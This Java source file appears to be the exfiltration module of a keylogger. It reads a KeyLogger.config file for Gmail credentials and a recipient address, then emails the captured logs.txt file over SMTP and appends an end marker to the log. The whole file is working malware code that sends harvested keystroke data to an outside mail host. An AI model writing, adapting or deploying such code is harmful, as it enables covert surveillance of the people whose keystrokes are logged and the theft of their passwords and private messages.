import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.util.concurrent.locks.ReentrantLock;
import java.util.Properties;
import javax.activation.*;
import javax.mail.*;
import javax.mail.internet.*;    
import javax.activation.*;
public class SendLogs implements Runnable{
    ReentrantLock re;
    String EOF = "EOFH";
    FileWriter fw;
    SendLogs(ReentrantLock re){
        this.re = re;
    }
    public void run(){
        FileReader reader = null;
        StringBuilder username = null;
        StringBuilder password = null;
        StringBuilder recipient = null;
        String usernames;
        String passwords;
        String recipients;
        StringBuilder stringBuilder = new StringBuilder();
        File tempFile = null;
        try{
            tempFile = new File("..//config//KeyLogger.config");
            reader = new FileReader(tempFile);
            int ch;
            while((ch = reader.read() )!= -1){
                stringBuilder.append((char)ch);
            }
            String str = stringBuilder.toString();
            int startIndex;
            int endIndex;
            str = str.replaceAll("\\s", "");
            startIndex = str.indexOf("email:\"");
            endIndex = str.indexOf("\"",startIndex+7);
            username = new StringBuilder(new String(str.substring(startIndex+7, endIndex)));
            startIndex = str.indexOf("password:\"");
            endIndex = str.indexOf("\"",startIndex+10);
            password = new StringBuilder(new String(str.substring(startIndex+10, endIndex)));
            startIndex = str.indexOf("recipient:\"");
            endIndex = str.indexOf("\"",startIndex+11);
            recipient = new StringBuilder(new String(str.substring(startIndex+11, endIndex)));
            usernames = username.toString();
            passwords = password.toString();
            recipients = recipient.toString();
            Properties props = new Properties();
            props.put("mail.smtp.auth", true);
            props.put("mail.smtp.starttls.enable", true);
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");
            Session session = Session.getInstance(props, 
            new javax.mail.Authenticator() {
                protected PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(usernames, passwords);
                }
            });
            try {
                    Message message = new MimeMessage(session);
                    message.setFrom(new InternetAddress(usernames));
                    message.setRecipients(Message.RecipientType.TO,
                        InternetAddress.parse(recipients));
                    message.setSubject("Testing Subject");
                    message.setText("PFA");
                    MimeBodyPart messageBodyPart = new MimeBodyPart();
                    Multipart multipart = new MimeMultipart();
                    messageBodyPart = new MimeBodyPart();
                    String path = System.getProperty("user.dir");
                    path = path.replace("\\","\\\\");
                    System.out.println(path);
                    int beginIndex = path.lastIndexOf("\\");
                    path = path.substring(0, beginIndex+1);
                    path += "logs\\logs.txt";
                    String file = path;
                    String fileName = "logs.txt";
                    DataSource source = new FileDataSource(file);
                    messageBodyPart.setDataHandler(new DataHandler(source));
                    messageBodyPart.setFileName(fileName);
                    multipart.addBodyPart(messageBodyPart);
                    message.setContent(multipart);
                    Transport.send(message);
                    fw = new FileWriter("..//logs//logs.txt",true);
                    re.lock();
                    fw.write(EOF);
                    fw.flush();
                    re.unlock();
           }catch(MessagingException e) {
               e.printStackTrace();
           }finally{
               try{
                   fw.close();
               }catch(Exception e){
                   System.out.println(e);
               }
           }
        }catch(Exception e){
            System.out.println(e);
        }
    }
}